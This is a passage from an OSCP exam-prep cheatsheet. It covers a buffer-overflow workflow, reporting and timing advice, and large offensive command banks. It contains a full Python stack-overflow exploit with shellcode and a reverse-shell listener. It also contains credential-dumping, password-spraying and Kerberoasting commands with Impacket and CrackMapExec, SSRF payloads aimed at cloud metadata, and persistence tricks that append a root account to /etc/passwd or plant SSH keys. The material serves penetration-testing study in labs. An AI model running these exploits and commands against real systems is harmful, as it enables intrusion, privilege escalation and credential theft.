  -b "\x00\x0a\x0d"        # ← YOUR bad chars here

# Output will look like:
# buf =  b""
# buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5..."

# Copy the entire buf = ... block
# Shellcode size is typically ~350-400 bytes
# NOP sled of 16 bytes is enough padding before shellcode
```

</details>

<details>
<summary>🚀 17.7 Step 7 — Final Exploit</summary>

```python
#!/usr/bin/env python3
# exploit.py — THE FINAL EXPLOIT
import socket

ip   = "TARGET_IP"
port = TARGET_PORT

# ── FILL THESE IN ─────────────────────────────────────────────
prefix   = "OVERFLOW1 "   # The vulnerable command
offset   = 1978           # Exact EIP offset
retn     = b"\xaf\x11\x50\x62"  # JMP ESP in little endian
padding  = b"\x90" * 16  # NOP sled (16 bytes is plenty)

# Paste msfvenom -f python output below:
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
# ... (full shellcode here)

# ── BUILD PAYLOAD ─────────────────────────────────────────────
payload = bytes(prefix, "latin-1") + b"A" * offset + retn + padding + buf + b"\r\n"

# ── FIRE ──────────────────────────────────────────────────────
print(f"[*] Payload size: {len(payload)} bytes")
print(f"[*] Sending exploit to {ip}:{port}...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    s.recv(1024)
    s.send(payload)
    print("[+] Done! Check your listener...")
```

```bash
# Start listener BEFORE running exploit:
nc -nvlp YOUR_LPORT
# Or:
rlwrap nc -nvlp YOUR_LPORT    # For arrow keys in shell
```

</details>

<details>
<summary>📋 17.8 Mona Quick Reference — All Commands</summary>

```
# ── SETUP ─────────────────────────────────────────────────────
!mona config -set workingfolder C:\mona\%p

# ── PATTERN ───────────────────────────────────────────────────
!mona pc 2400                # Pattern create (length 2400)
!mona po 386F4337            # Pattern offset for EIP value
!mona findmsp -distance 2400 # Find all pattern matches in memory

# ── BYTEARRAY ─────────────────────────────────────────────────
!mona bytearray -b "\x00"
!mona bytearray -b "\x00\x0a\x0d\x25\x26\x2b\x3d"  # All bad chars

# ── COMPARE ───────────────────────────────────────────────────
!mona compare -f C:\mona\APP\bytearray.bin -a 0xDEADBEEF
# Status: OK = no more bad chars | Corrupted = still more to find

# ── MODULES ───────────────────────────────────────────────────
!mona modules
# Shows: Module, Base, Top, Rebase, SafeSEH, ASLR, NXCompat, OS DLL

# ── JMP ESP ───────────────────────────────────────────────────
!mona jmp -r esp -cpb "\x00\x0a\x0d"
!mona jmp -r esp -m "module.dll" -cpb "\x00"
!mona find -s "\xff\xe4" -m module.dll    # Manual opcode search

# ── SUGGEST ───────────────────────────────────────────────────
!mona suggest    # Suggests exploit structure after crash

# ── STACK / REGISTERS ─────────────────────────────────────────
!mona seh -cpb "\x00"       # Find SEH gadgets (for SEH overflows)
!mona nosafeseh             # Find modules without SafeSEH

# ── EGGHUNTER ─────────────────────────────────────────────────
!mona egg -t w00t           # Generate egghunter for tag "w00t"

# ── OUTPUT LOCATION ───────────────────────────────────────────
# All output → C:\mona\APPNAME\
# Key files: jmp.txt, bytearray.bin, compare.txt, modules.txt
```

</details>

<details>
<summary>🔧 17.9 Common BOF Problems & Fixes</summary>

```
PROBLEM: EIP shows "41414141" after sending pattern
FIX: Pattern wasn't long enough — increase msf-pattern_create -l value

PROBLEM: EIP not overwritten even with correct offset
FIX: Check if there's a length check in the protocol — try different prefix

PROBLEM: Shellcode not executing even with correct JMP ESP
FIX: 
  1. Bad chars in shellcode — recheck byte array
  2. Not enough space — verify ESP has 400+ bytes available
  3. NOP sled too short — increase to 32 bytes
  4. EXITFUNC wrong — use EXITFUNC=thread

PROBLEM: Shell connects but dies immediately
FIX: Use EXITFUNC=thread in msfvenom

PROBLEM: "No badchars found" but exploit still fails  
FIX: The \x00 you assumed is bad might be fine — test explicitly

PROBLEM: All JMP ESP addresses have bad chars in them
FIX: Look in other modules — use !mona jmp -r esp (no -m flag)
     Try CALL ESP, PUSH ESP/RET combos

PROBLEM: App crashes before reaching shellcode
FIX: Shellcode corrupted — re-run bad char analysis from scratch

PRO TIPS:
  - Always restart app cleanly between each test (Ctrl+F2 then F9)
  - Verify ESP address fresh each run — may differ by small amount
  - 16 NOP bytes before shellcode is standard; increase if issues
  - Generate shellcode with -f python for cleaner copy-paste
  - Use rlwrap nc -nvlp PORT for better shell interaction
```

</details>

---

## 18. REPORTING & DOCUMENTATION

<details>
<summary>📸 18.1 Screenshot Requirements — Never Fail on This</summary>

```bash
# ── LINUX PROOF SCREENSHOT ────────────────────────────────────
# Single command that captures everything needed:
hostname && id && ip a | grep -A2 tun0 && cat /root/proof.txt
# OR (more readable):
echo "=== HOSTNAME ===" && hostname
echo "=== USER ===" && id && whoami
echo "=== IP ===" && ip a
echo "=== PROOF ===" && cat /root/proof.txt

# ── WINDOWS PROOF SCREENSHOT ──────────────────────────────────
echo === HOSTNAME === && hostname
echo === USER === && whoami
echo === IP === && ipconfig
echo === PROOF === && type C:\Users\Administrator\Desktop\proof.txt

# ── WHAT THE SCREENSHOT MUST SHOW ────────────────────────────
# 1. IP address of the target (ipconfig / ip a)
# 2. Hostname of the target
# 3. Your username (whoami / id — must show root/Administrator/SYSTEM)
# 4. The proof.txt / local.txt CONTENT (not just path)
# 5. All in the SAME screenshot (no cropping different windows)

# ── TAKE SCREENSHOTS AS YOU GO ────────────────────────────────
# Don't wait until the end — screenshot every major step:
# - Initial nmap results
# - Service version that led to exploit
# - Exploit running
# - Initial shell (whoami)
# - Privesc technique used
# - Root/Admin proof
```

</details>

<details>
<summary>📄 18.2 Proof File Locations</summary>

```
LINUX:
  User flag: /home/USERNAME/local.txt
  Root flag: /root/proof.txt

WINDOWS:
  User flag: C:\Users\USERNAME\Desktop\local.txt
  Admin flag: C:\Users\Administrator\Desktop\proof.txt
  System flag: C:\Windows\System32\proof.txt (sometimes)

IMPORTANT:
  - Submit flags in the control panel AS SOON AS you get them
  - Don't rely on memory — copy/paste to notes immediately
  - If proof.txt shows [ACCESS DENIED] → you're not root yet
  - Both flags count for points — don't skip user flag
  
PARTIAL POINTS:
  - Local.txt (user shell) = 10 pts
  - Proof.txt (root/admin) = 10 pts
  - Total per machine = 20 pts
  - Documenting HOW you got there is required for credit
```

</details>

<details>
<summary>📝 18.3 Note-Taking Template (Use Per Machine)</summary>

```markdown
# Machine: TARGET_IP — HOSTNAME

## Status: [ ] Scanning [ ] Foothold [ ] Privesc [ ] Root [ ] Documented

## Open Ports
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22   | SSH     | OpenSSH 7.4 | |
| 80   | HTTP    | Apache 2.4 | WordPress |

## Credentials Found
| Username | Password | Hash | Service | Where Found |
|----------|----------|------|---------|-------------|
| admin    | admin123 |      | SSH     | /etc/backup |

## Attack Path
1. Port 80 → WordPress 5.2.3
2. wpscan → user: admin
3. Brute force → admin:admin123
4. Theme editor → PHP shell
5. Shell as www-data
6. /etc/cron.d → root runs /opt/backup.sh
7. /opt/backup.sh writable → reverse shell
8. Root!

## Commands Used
```bash
# Key commands here
```

## Proof
- local.txt: [CONTENT]
- proof.txt: [CONTENT]
- Screenshots: [FILENAMES]
```

</details>

<details>
<summary>📊 18.4 OSCP Report Structure</summary>

```
REQUIRED SECTIONS:
1. High-Level Summary
   - # of machines compromised
   - Severity of findings

2. Methodology
   - Tools used
   - General approach

3. Per-Machine Writeup (for EACH machine):
   a. Machine info (IP, OS, hostname)
   b. Service enumeration
   c. Exploitation (step by step, with screenshots)
   d. Post-exploitation
   e. Privilege escalation (step by step, with screenshots)
   f. Proof (screenshot of proof.txt with IP/hostname visible)

4. Appendix
   - Tool outputs
   - Modified exploit code (full code)

REPORT TIPS:
  - Include EVERY command you ran, not just the successful ones
  - Screenshots should have timestamps if possible
  - Reproduce the attack in your writeup — reviewer must be able to follow
  - Use the OSCP report template (available on OffSec website)
  - Submit report within 24 hours of exam end
  - PDF format required

COMMON REPORT FAILURES:
  ✗ Proof screenshot without IP visible
  ✗ Steps not reproducible from your writeup
  ✗ Missing screenshots at key steps
  ✗ No proof of privilege escalation method
  ✗ Late submission
```

</details>

<details>
<summary>⏱️ 18.5 Time Management Strategy</summary>

```
24-HOUR EXAM PLAN:

Hours 00-01: ENUMERATION BLITZ
  - Start autorecon on ALL machines simultaneously
  - Quick nmap top-1000 on all targets
  - Note all open services
  - Don't exploit yet — know your targets first

Hours 01-03: BOF MACHINE (20 pts — DO THIS FIRST)
  - Easiest guaranteed points
  - Should take 20-30 min if practiced
  - If stuck > 45 min, move on and come back

Hours 03-10: ACTIVE DIRECTORY SET (40 pts)
  - Highest point value per machine
  - Work in sequence: foothold → pivot → DA
  - BloodHound immediately after getting first creds
  - Don't stop until you have DA or are truly stuck

Hours 10-18: STANDALONE MACHINES (20+20+20 pts)
  - Start with the one you identified easiest in hour 0
  - Work one machine fully before moving to next
  - Always get user flag before trying for root

Hours 18-22: STUCK MACHINE TIME
  - Return to any unfinished machine
  - Fresh eyes — re-read all nmap output
  - Try different attack vectors
  - Remember: partial points exist

Hours 22-24: DOCUMENTATION
  - Ensure all screenshots are complete
  - All proof.txt contents captured
  - Notes coherent enough for report
  - SUBMIT FLAGS if not already done

BREAK SCHEDULE (MANDATORY):
  Every 3-4 hours: 15-20 min break
  One proper meal break
  Short walk, fresh air before tough machines
  Don't sit for 24 straight — productivity tanks

STUCK? TRY THIS CHECKLIST:
  1. Re-read ALL nmap output — did you miss a port?
  2. Re-run gobuster with different wordlist/extensions
  3. Check every discovered credential against every service
  4. Check version of EVERY service for CVEs
  5. Look at source code of web pages
  6. Check default credentials again
  7. Look for hidden directories with bigger wordlist
  8. Try accessing the box from a different angle (different port)
  9. Take a break — seriously
  10. It's simpler than you think — go back to basics
```

</details>

---

## 19. QUICK REFERENCE CARD

<details>
<summary>🔌 19.1 Ports & Services Reference</summary>

```
TCP PORTS:
  21    FTP          | 1080  SOCKS
  22    SSH          | 1099  Java RMI
  23    Telnet       | 1433  MSSQL
  25    SMTP         | 1521  Oracle TNS
  53    DNS          | 2049  NFS
  80    HTTP         | 2375  Docker API
  88    Kerberos     | 3268  LDAP GC
  110   POP3         | 3306  MySQL
  111   RPCbind      | 3389  RDP
  119   NNTP         | 3690  SVN
  135   MSRPC        | 4444  Metasploit default
  139   NetBIOS      | 5432  PostgreSQL
  143   IMAP         | 5900  VNC
  161   SNMP (UDP)   | 5985  WinRM HTTP
  389   LDAP         | 5986  WinRM HTTPS
  443   HTTPS        | 6379  Redis
  445   SMB          | 6667  IRC
  465   SMTPS        | 8080  HTTP Alt
  512   rexec        | 8443  HTTPS Alt
  513   rlogin       | 8888  HTTP Alt
  514   rsyslog      | 9200  Elasticsearch
  515   LPD/LPR      | 27017 MongoDB
  631   CUPS         | 11211 Memcached
  636   LDAPS        |
  873   rsync        |
```

</details>

<details>
<summary>🛠️ 19.2 Impacket Complete Toolkit</summary>

```bash
# ── EXECUTION ─────────────────────────────────────────────────
impacket-psexec     DOMAIN/user:pass@IP          # SMB exec → SYSTEM
impacket-smbexec    DOMAIN/user:pass@IP          # SMB exec → service shell
impacket-wmiexec    DOMAIN/user:pass@IP          # WMI exec → no service
impacket-atexec     DOMAIN/user:pass@IP 'whoami' # Task scheduler
impacket-dcomexec   DOMAIN/user:pass@IP 'whoami' # DCOM exec

# ── KERBEROS ──────────────────────────────────────────────────
impacket-GetNPUsers    DOMAIN/ -dc-ip IP -request           # AS-REP roast
impacket-GetUserSPNs   DOMAIN/user:pass -dc-ip IP -request  # Kerberoast
impacket-ticketer      -nthash HASH -domain-sid SID -domain DOMAIN user  # Ticket forge
impacket-getTGT        DOMAIN/user:pass                      # Get TGT
impacket-getST         DOMAIN/user:pass -spn cifs/target     # Get service ticket

# ── CREDENTIAL DUMPING ────────────────────────────────────────
impacket-secretsdump   DOMAIN/user:pass@IP                   # Remote dump
impacket-secretsdump   DOMAIN/user:pass@IP -just-dc-ntlm     # NTDS only
impacket-secretsdump   -sam SAM -system SYSTEM LOCAL         # Local files
impacket-secretsdump   -ntds ntds.dit -system SYSTEM LOCAL   # NTDS.dit

# ── ENUMERATION ───────────────────────────────────────────────
impacket-lookupsid     DOMAIN/user:pass@IP                   # SID enum
impacket-samrdump      DOMAIN/user:pass@IP                   # SAR dump
impacket-rpcdump       IP                                    # RPC endpoints
impacket-reg           DOMAIN/user:pass@IP query -keyName HKU # Remote registry

# ── FILE OPERATIONS ───────────────────────────────────────────
impacket-smbclient     DOMAIN/user:pass@IP                   # SMB client
impacket-smbserver     share /path/to/share -smb2support     # Host SMB share

# ── DATABASE ──────────────────────────────────────────────────
impacket-mssqlclient   DOMAIN/user:pass@IP                   # MSSQL client

# ── NETWORK ───────────────────────────────────────────────────
impacket-ntlmrelayx    -tf targets.txt -smb2support          # NTLM relay
impacket-nmapAnswerMachine                                    # Fake service

# ── WITH HASH (PtH) ───────────────────────────────────────────
impacket-psexec    DOMAIN/user@IP -hashes :NTLMHASH
impacket-wmiexec   DOMAIN/user@IP -hashes :NTLMHASH
impacket-secretsdump DOMAIN/user@IP -hashes :NTLMHASH

# ── WITH KERBEROS TICKET ──────────────────────────────────────
export KRB5CCNAME=user.ccache
impacket-psexec    DOMAIN/user@IP -no-pass -k
```

</details>

<details>
<summary>⚡ 19.3 CrackMapExec Full Reference</summary>

```bash
# ── SMB ───────────────────────────────────────────────────────
crackmapexec smb IP -u user -p pass
crackmapexec smb IP -u user -H NTLMHASH          # PtH
crackmapexec smb IP -u users.txt -p pass          # User spray
crackmapexec smb IP -u user -p passwords.txt      # Pass spray
crackmapexec smb IP -u user -p pass --shares      # List shares
crackmapexec smb IP -u user -p pass --sessions    # Active sessions
crackmapexec smb IP -u user -p pass --users       # Domain users
crackmapexec smb IP -u user -p pass --groups      # Domain groups
crackmapexec smb IP -u user -p pass --computers   # Domain computers
crackmapexec smb IP -u user -p pass --loggedon-users
crackmapexec smb IP -u user -p pass --sam         # Dump SAM
crackmapexec smb IP -u user -p pass --lsa         # Dump LSA
crackmapexec smb IP -u user -p pass --ntds        # Dump NTDS (DC only)
crackmapexec smb IP -u user -p pass -x 'whoami'   # Run cmd command
crackmapexec smb IP -u user -p pass -X 'Get-Process'  # Run PS command
crackmapexec smb IP -u user -p pass --local-auth  # Local account auth
crackmapexec smb IP/24 -u admin -H HASH --local-auth --continue-on-success

# ── WINRM ─────────────────────────────────────────────────────
crackmapexec winrm IP -u user -p pass
crackmapexec winrm IP -u user -p pass -x 'whoami'

# ── SSH ───────────────────────────────────────────────────────
crackmapexec ssh IP -u user -p pass
crackmapexec ssh IP/24 -u root -p passwords.txt

# ── MSSQL ─────────────────────────────────────────────────────
crackmapexec mssql IP -u sa -p pass -q "SELECT @@version"
crackmapexec mssql IP -u sa -p pass --local-auth
crackmapexec mssql IP -u sa -p pass -x "whoami"  # xp_cmdshell

# ── RDP ───────────────────────────────────────────────────────
crackmapexec rdp IP -u user -p pass
crackmapexec rdp IP/24 -u Administrator -p 'Password123'

# ── OUTPUT INTERPRETATION ─────────────────────────────────────
# [+] GREEN  = Authentication success
# [-] RED    = Authentication failure
# [*] BLUE   = Information
# Pwn3d!    = Local admin / can execute commands
```

</details>

<details>
<summary>🔗 19.4 Essential Resources</summary>

```
PRIVILEGE ESCALATION:
  GTFOBins (Linux):     https://gtfobins.github.io
  LOLBAS (Windows):     https://lolbas-project.github.io
  WADComs (AD):         https://wadcoms.github.io

SHELLS & PAYLOADS:
  RevShells generator:  https://www.revshells.com
  PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

EXPLOIT DATABASES:
  ExploitDB:            https://www.exploit-db.com
  Packetstorm:          https://packetstormsecurity.com
  NVD CVE:              https://nvd.nist.gov/vuln/search

HASH CRACKING:
  Hashcat examples:     https://hashcat.net/wiki/doku.php?id=example_hashes
  CrackStation:         https://crackstation.net  (quick online check)
  Hashes.com:           https://hashes.com/en/decrypt/hash

ENCODING/DECODING:
  CyberChef:            https://gchq.github.io/CyberChef
  JWT decoder:          https://jwt.io

OSCP REFERENCE:
  HackTricks:           https://book.hacktricks.xyz
  IppSec YouTube:       https://www.youtube.com/@ippsec
  S1ren OSCP guide:     https://github.com/0xsyr0/OSCP
  TJ Null List:         https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8

AD REFERENCE:
  AD Security:          https://adsecurity.org
  HackTricks AD:        https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
  BloodHound queries:   https://github.com/ly4k/BloodHound/

WORDLISTS:
  SecLists:             https://github.com/danielmiessler/SecLists
  Assetnote:            https://wordlists.assetnote.io

OSCP EXAM GUIDE:
  Official:             https://help.offsec.com/hc/en-us/articles/360040165632
```

</details>

<details>
<summary>⚡ 19.5 One-Liner Command Bank</summary>

```bash

# mtu packet set
sudo ifconfig tun0 mtu 1198

# ── QUICK WINS ────────────────────────────────────────────────
# Check sudo instantly:
sudo -l 2>/dev/null

# Find SUID instantly:
find / -perm -4000 -type f 2>/dev/null

# Find world-writable:
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Find passwords in files:
grep -r "password\|passwd\|secret\|credential" /var/www/ 2>/dev/null
grep -r "password" /etc/ 2>/dev/null | grep -v "#" | grep -v "Binary"

# Check cron:
cat /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null | grep -v "^#"

# Check capabilities:
getcap -r / 2>/dev/null

# Check listening services (internal):
ss -tulnp | grep "127.0.0.1"
netstat -antup | grep "127.0.0.1"

# Check for ssh keys:
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Unshadow for cracking:
unshadow /etc/passwd /etc/shadow > /tmp/combined.txt

# ── PORT FORWARDING ONE-LINERS ────────────────────────────────
# SSH local forward:
ssh -L 8080:127.0.0.1:8080 -N user@PIVOT -i key

# Chisel forward:
./chisel client LHOST:8000 R:socks &

# Socat forward:
socat TCP-LISTEN:8080,fork TCP:INTERNAL_IP:80 &

# ── SHELL UPGRADE ONE-LINER ───────────────────────────────────
python3 -c 'import pty;pty.spawn("/bin/bash")' ; stty raw -echo ; fg

# ── WINDOWS QUICK CHECKS ──────────────────────────────────────
# Check all privesc vectors in one shot:
whoami /all & net user & systeminfo & tasklist & schtasks /query /fo csv & reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

# Quick cred hunt:
findstr /si "password" *.txt *.xml *.ini *.config 2>nul
dir /s /b *pass* *cred* *vnc* 2>nul

# ── AD QUICK WINS ─────────────────────────────────────────────
# AS-REP roast with no creds:
GetNPUsers.py DOMAIN/ -dc-ip IP -request -no-pass -usersfile users.txt

# Kerberoast with creds:
GetUserSPNs.py DOMAIN/user:pass -dc-ip IP -request

# Spray single password:
crackmapexec smb IP -u users.txt -p 'Password123' --continue-on-success

# Dump everything after DA:
impacket-secretsdump DOMAIN/Administrator:pass@DC_IP
```

</details>

---

## 20. EXAM DAY CHECKLIST

<details>
<summary>🌅 20.1 Before the Exam Starts</summary>

```
NIGHT BEFORE:
[ ] Sleep 7-8 hours minimum — this is non-negotiable
[ ] Prepare food and water
[ ] Test VPN connection
[ ] Verify Kali VM is running properly
[ ] Check all tools are installed and updated
[ ] Review your notes / cheatsheet one final time
[ ] Set up tmux config
[ ] Prepare note-taking template (copy for 5 machines)
[ ] Know exam end time and set alarms for breaks

30 MINUTES BEFORE:
[ ] Connect to exam VPN — verify it works
[ ] Open note-taking application
[ ] Open Burp Suite
[ ] Start tmux session
[ ] Verify tun0 IP: ip a show tun0
[ ] Check: export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
[ ] Have proof.txt screenshot template ready
[ ] Have report template open
[ ] Read the exam instructions ONE MORE TIME
[ ] Deep breath
```

</details>

<details>
<summary>🚀 20.2 First 30 Minutes — The Blitz</summary>

```bash
# ── LAUNCH ALL SCANS SIMULTANEOUSLY ───────────────────────────
# You have 5 targets — scan them all NOW, enumerate while they run

# For each target IP (do them all in parallel in different tmux panes):
mkdir -p ~/oscp/{BOF,AD_DC,AD_WS,STANDALONE1,STANDALONE2}/{scans,loot,exploit}

# Quick scan (fastest results):
nmap -p 21,22,23,25,53,80,88,110,111,135,139,143,161,389,443,445,636,1433,1521,2049,3306,3389,3632,5432,5900,5985,8080,8443 --min-rate 5000 -T4 ALL_IPS -oN ~/oscp/initial_scan.txt

# Full port scan (background):
nmap -p- --min-rate 10000 -T4 ALL_IPS -oN ~/oscp/allports.txt &

# Autorecon on all:
autorecon ALL_IPS --single-target --output ~/oscp/ &

# ── WHILE SCANS RUN ───────────────────────────────────────────
# Read the exam control panel carefully:
# - Note which machine is the BOF
# - Note any special instructions
# - Note scoring breakdown
# - Screenshot the control panel

# ── FIRST ACTIONS BASED ON OPEN PORTS ────────────────────────
# BOF machine → start immediately (Section 17)
# SMB open everywhere → run crackmapexec fingerprint
# Port 88 open → it's an AD machine → note DC IP
# Port 80 open → browse immediately, run gobuster
```

</details>

<details>
<summary>🎯 20.3 Machine Priority & Decision Tree</summary>

```
STEP 1: IDENTIFY MACHINE TYPES
  Port 88 (Kerberos) + Port 389 (LDAP) = DOMAIN CONTROLLER
  Multiple Windows machines with 445 = AD Environment
  Only one machine given for BOF = BOF Machine
  Linux machines = Standalone

STEP 2: ATTACK ORDER
  Priority 1: BOF Machine (guaranteed 20 pts, ~20 min)
  Priority 2: AD Foothold (get initial creds/access)
  Priority 3: AD Lateral + DA (remaining 30 pts)
  Priority 4: Easiest standalone (user + root)
  Priority 5: Second standalone
  Priority 6: Third standalone (hardest)

STEP 3: MINIMUM TO PASS (70 pts)
  BOF complete:              20 pts
  AD user flag:              10 pts
  AD DA:                     40 pts
  One standalone user:       10 pts
  TOTAL:                     80 pts ✓

  WITHOUT AD:
  BOF:                       20 pts
  All 3 standalone user:     30 pts
  All 3 standalone root:     30 pts
  TOTAL:                     80 pts ✓ (harder path)

STEP 4: IF YOU GET STUCK
  > 45 min with zero progress = move on
  Note exactly where you are
  Come back with fresh eyes
  The answer is almost always "enumerate more"
```

</details>

<details>
<summary>🚨 20.4 Common Exam Mistakes — Avoid All of These</summary>

```
TECHNICAL MISTAKES:
  ✗ Forgetting to check UDP ports (161 SNMP especially)
  ✗ Not trying anonymous/null session on SMB and FTP
  ✗ Not checking for default credentials on every web login
  ✗ Running Metasploit on more than 1 machine
  ✗ Not URL-encoding payloads when injecting via URL
  ✗ Forgetting EXITFUNC=thread in BOF shellcode
  ✗ Not setting binary mode in FTP before downloading
  ✗ Not trying found credentials on ALL other services
  ✗ Stopping at user shell — always try for root
  ✗ Not reading /proc/self/fd/ when LFI is available
  ✗ Missing internal ports (127.0.0.1 only services)
  ✗ Not checking version numbers against searchsploit
  ✗ Using staged payloads when target can't reach back

DOCUMENTATION MISTAKES:
  ✗ Not taking screenshot WITH IP visible
  ✗ Proof screenshot shows filename but not contents
  ✗ Forgetting to submit flags in control panel
  ✗ Not documenting the exact exploit used
  ✗ Missing screenshots of privilege escalation steps
  ✗ Not noting every command that led to compromise
  ✗ Forgetting local.txt (user flag) — it's 10 pts!

MENTAL MISTAKES:
  ✗ Spending > 45 min on one attack path with no progress
  ✗ Not taking breaks — brain fog is real after 4+ hours
  ✗ Tunnel vision — fixating on one service when others need attention
  ✗ Not re-reading nmap results when stuck
  ✗ Assuming a port is unimportant because it's non-standard
  ✗ Not sleeping the night before the exam
  ✗ Panicking — everything has a solution, breathe and enumerate

SETUP MISTAKES:
  ✗ Not setting LHOST to tun0 IP (using eth0 instead)
  ✗ Forgetting to start a listener before sending exploit
  ✗ Shells timing out because listener wasn't ready
  ✗ File transfer failing because HTTP server not started
  ✗ Using wrong architecture payload (x86 vs x64)
  ✗ VPN disconnecting — check connectivity regularly
```

</details>

<details>
<summary>✅ 20.5 Pre-Submission Checklist</summary>

```
BEFORE ENDING EXAM:
[ ] All accessible flags captured (both local.txt and proof.txt)
[ ] All flags submitted in control panel
[ ] Screenshots taken for EVERY compromised machine showing:
      ✓ IP address visible
      ✓ Hostname visible
      ✓ Username (root/Administrator/SYSTEM)
      ✓ Flag contents visible
[ ] Key steps documented (even roughly)
[ ] Exploit code saved (for report)
[ ] All tool outputs saved (nmap, gobuster, etc.)
[ ] Shell history saved:
      history > ~/oscp/TARGET_IP/shell_history.txt
[ ] Note exact versions of vulnerable services
[ ] Note exact CVEs / exploit names used
[ ] Document ALL credentials found

REPORT SUBMISSION:
[ ] Start writing report immediately after exam
[ ] Use official OSCP report template
[ ] Include all screenshots (rename them meaningfully)
[ ] Every exploit step must be reproducible from your writeup
[ ] Include full exploit code in appendix
[ ] Proofread once
[ ] Submit as PDF within 24 hours
[ ] Keep a copy of the submission confirmation
```

</details>

---

## 🔥 BONUS: MOST MISSED TRICKS

<details>
<summary>💎 Tricks Most People Forget</summary>

```bash
# ── ALWAYS CHECK THESE (commonly missed) ─────────────────────

# 1. Password reuse across ALL services (do this EVERY time you find creds)
for svc in ssh smb winrm rdp mssql ftp; do
  crackmapexec $svc $IP -u user -p pass 2>/dev/null | grep -v "[-]"
done

# 2. /etc/crontab AND /var/spool/cron/crontabs — different locations!
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null | grep -v "^#"

# 3. Internal web apps (common in OSCP):
ss -tulnp | grep ":8"   # Any 8xxx port?
curl http://127.0.0.1:8080  # Try it directly
ssh -L 8080:127.0.0.1:8080 user@$IP  # Forward to see it from Kali

# 4. .bash_history is GOLD — always read it:
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null | sort -u

# 5. Check /var/backups/ and /opt/:
ls -laR /var/backups/ 2>/dev/null
ls -laR /opt/ 2>/dev/null

# 6. Config files usually have DB creds — check web root:
find /var/www -name "*.php" -exec grep -l "password\|DB_PASS\|db_pass" {} \;

# 7. SUID find exploit (super common, always missed):
find / -perm -4000 -type f 2>/dev/null | while read f; do
  echo "=== $f ===" && strings $f | grep -v "/" | head -5
done

# 8. NFS no_root_squash (check EVERY time NFS is open):
showmount -e $IP
cat /etc/exports 2>/dev/null | grep -i "no_root_squash"

# 9. Writable cron scripts (use pspy to watch, then check permissions):
./pspy64 &
sleep 60 && cat /tmp/pspy.log | grep "root\|UID=0" | grep -v "pspy"

# 10. MySQL file write requires:
# - FILE privilege (check: SHOW GRANTS)
# - secure_file_priv = '' (check: SHOW variables LIKE 'secure_file_priv')
# - Write access to target path
mysql -u root -p -e "SHOW variables LIKE 'secure_file_priv';"

# 11. GPP passwords in SYSVOL (if you have any domain user creds):
crackmapexec smb $DC -u user -p pass -M gpp_password
crackmapexec smb $DC -u user -p pass -M gpp_autologin
# Manual:
smbclient //DC/SYSVOL -U user%pass
# find Groups.xml and decrypt with: gpp-decrypt "HASH"

# 12. Unattended install files (Windows — forgotten by admins):
dir /s /b C:\Windows\Panther\Unattend*.xml 2>nul
dir /s /b C:\Windows\system32\sysprep\sysprep*.xml 2>nul

# 13. AutoLogon credentials in registry (jackpot when it exists):
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# 14. SSRF to read cloud metadata (check in web apps):
curl -s "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://TARGET/fetch?url=file:///etc/passwd"

# 15. Always check if you can write to /etc/passwd (even as low priv):
ls -la /etc/passwd
stat /etc/passwd
# If world-writable (rare but happens in OSCP):
openssl passwd -1 -salt abc password
echo "hacker:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd && su hacker

# 16. SSH authorized_keys (if you find someone's public key dir writable):
ssh-keygen -f /tmp/key -N ""
cat /tmp/key.pub >> /home/user/.ssh/authorized_keys
ssh -i /tmp/key user@$IP

# 17. Linpeas gives you color hints — ALWAYS follow the RED findings first!
# RED = critical = try immediately
# YELLOW = interesting = try after red
# Linpeas exit code 0 = ran fine, look at output carefully

# 18. MySQL UDF privesc (if MySQL running as root + have FILE priv):
searchsploit mysql udf
# Download raptor_udf2.c, compile, upload, create function → OS command exec

# 19. PHP disable_functions bypass (if you get a PHP shell but can't exec):
# Try: system, exec, passthru, shell_exec, popen, proc_open
# If all disabled → try: mail(), dl(), pcntl_exec()
# Or use Chankro bypass

# 20. If stuck on Windows privesc — check scheduled tasks binary paths:
schtasks /query /fo LIST /v | findstr /i "task to run\|run as"
# Then check if that binary is writable
icacls "C:\path\to\task_binary.exe"
```

</details>

<details>
<summary>🎓 Final OSCP Wisdom</summary>

```
MINDSET SHIFTS THAT MAKE PEOPLE PASS:

1. ENUMERATION IS THE EXPLOIT
   "The finding is in the nmap output — I just haven't read it carefully enough"
   Go back to basics when stuck. Re-read everything.

2. EVERY CREDENTIAL IS A SKELETON KEY
   Any username/password/hash found → try on every service immediately
   Password reuse is the #1 path to lateral movement

3. DEFAULT CREDS STILL WORK IN 2025
   admin/admin, root/root, service/service, admin/password
   Try them. On everything. Every time.

4. THE RABBIT HOLE TEST
   If you've been on one path > 45 min with ZERO new information:
   That's a rabbit hole. Stop. Note it. Move on.

5. THE OSCP IS A BEGINNER EXAM
   The vulnerabilities are not cutting-edge.
   Old CVEs, misconfigurations, default passwords, weak permissions.
   It's not CTF-style trickery — it's classic pentesting.

6. DOCUMENTATION WINS OR LOSES POINTS
   A well-documented partial compromise can score points.
   An undocumented full compromise might not.
   Screenshot. Notes. Commands. Constantly.

7. THE EXAM IS SOLVABLE
   Every machine has a solution. Every path has been walked.
